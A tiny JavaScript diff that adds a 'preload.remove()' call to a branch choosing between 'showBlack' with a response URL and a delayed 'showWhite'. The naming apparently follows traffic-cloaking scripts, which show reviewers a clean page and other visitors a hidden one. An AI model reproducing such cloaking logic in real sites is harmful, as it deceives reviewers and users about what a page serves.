@@ -85,7 +85,7 @@ window.addEventListener('DOMContentLoaded', () => {
        
         showBlack(res.url + '/nf5nPY3n');
       } else {
-      
+        preload.remove();
         setTimeout(showWhite, 300);
       }
     })
